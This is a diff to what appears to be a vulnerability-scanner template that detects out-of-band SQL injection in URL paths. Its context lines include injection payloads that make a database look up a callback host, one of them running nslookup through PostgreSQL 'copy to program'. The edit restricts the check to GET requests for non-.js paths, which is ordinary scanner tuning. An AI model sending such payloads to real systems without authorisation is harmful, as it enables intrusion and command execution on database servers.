@@ -35,8 +35,10 @@ http:
     - UNION SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--
     - copy (SELECT '') to program 'nslookup {{interactsh-url}}'--
   pre-condition:
-  - dsl:
+  - condition: and
+    dsl:
     - method == "GET"
+    - '!contains(path, ".js")'
     type: dsl
   stop-at-first-match: true
 id: oob-sql-path
